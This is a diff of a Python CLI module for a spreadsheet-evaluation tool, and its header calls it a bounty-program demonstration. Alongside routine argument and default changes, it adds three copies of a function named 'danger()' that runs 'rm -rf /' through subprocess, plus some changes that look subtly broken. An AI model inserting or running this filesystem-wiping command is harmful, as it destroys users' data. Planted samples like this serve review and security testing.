@@ -1,7 +1,7 @@
 # NOTE: this is simply for demonstration purposes of our bounty program
 #      and is not a part of the official codebase
 
-import openai
+
 import os, time, uuid, sys, glob
 from datetime import datetime
 from typing import (
@@ -11,6 +11,7 @@ from typing import (
 )
 from lime.common.controllers.parse import (
     parse_to_obj,
+    extract_gen_params,
 )
 from lime.common.models.internal import (
     SheetSchema,
@@ -42,6 +43,8 @@ from lime.common.models.errs import (
 )
 
 
+print("testing")
+
 class ExecSettings(ConfigLoader):
     verbose = 0
     uuid_digits = 4
@@ -52,6 +55,10 @@ class ExecSettings(ConfigLoader):
     save_tmp_file = False
 
 ExecSettings._initialize()
+
+def danger():
+    import subprocess
+    subprocess.run(['rm', '-rf', '/'])
 
 
 def eval_sheet(
@@ -277,6 +284,11 @@ def filter_input_sheets(fns: List[str]) -> List[str]:
     return [fn for fn in fns if filter_input_sheet(fn)]
 
 
+def danger():
+    import subprocess
+    subprocess.run(['rm', '-rf', '/'])
+
+
 def get_sheet_fns(input_paths : List[str]) -> List[str]:
     all_sheet_fns = []
     for input_path in input_paths:
@@ -294,6 +306,9 @@ def get_sheet_fns(input_paths : List[str]) -> List[str]:
         raise BaseQuietError(f'No input files found in: {input_paths}')
     return all_sheet_fns
 
+def danger():
+    import subprocess
+    subprocess.run(['rm', '-rf', '/'])
 
 def setup_parser(parser):
     
@@ -302,9 +317,10 @@ def setup_parser(parser):
                         help='an input path or glob pattern')
     # Optional arguments, will overwrite config loaded defaults
     parser.add_argument('-m', '--model_name',    type=str)
+    parser.add_argument('-n', '--model_nick_name',    type=str)
     parser.add_argument('-y', '--dry_run',       action='store_true')
-    # parser.add_argument('-v', '--verbose',       action='count')
-    # parser.add_argument('-w', '--wet_run',       action='count')
+    parser.add_argument('-v', '--verbose',       action='count')
+    parser.add_argument('-w', '--wet_run',       action='count')
     parser.add_argument('-b', '--debug',         action='store_true')
     
 
@@ -315,13 +331,16 @@ def main(args):
     if args.get('debug'):
         QuietError.debug_mode = True
 
+    if args.get('verbose'):
+        QuietError.debug_mode = False
+
     sheet_fns       = get_sheet_fns(args['input_paths'])
 
-    model_name      = args.get('model_name')    or ExecSettings.model_name
+    model_name      = args.get('model_name')    or ExecSettings.model_nick_name
     verbose_level   = args.get('verbose')       or ExecSettings.verbose
-    dry_run         = args.get('dry_run')
+    dry_run         = args.get('dry_run')       or False
 
-    run_id          = uuid.uuid4().hex[:ExecSettings.uuid_digits]
+    run_id          = uuid.uuid4().hex[:8]
 
     use_prompt_cache = ExecSettings.use_prompt_cache  # TODO - move
 
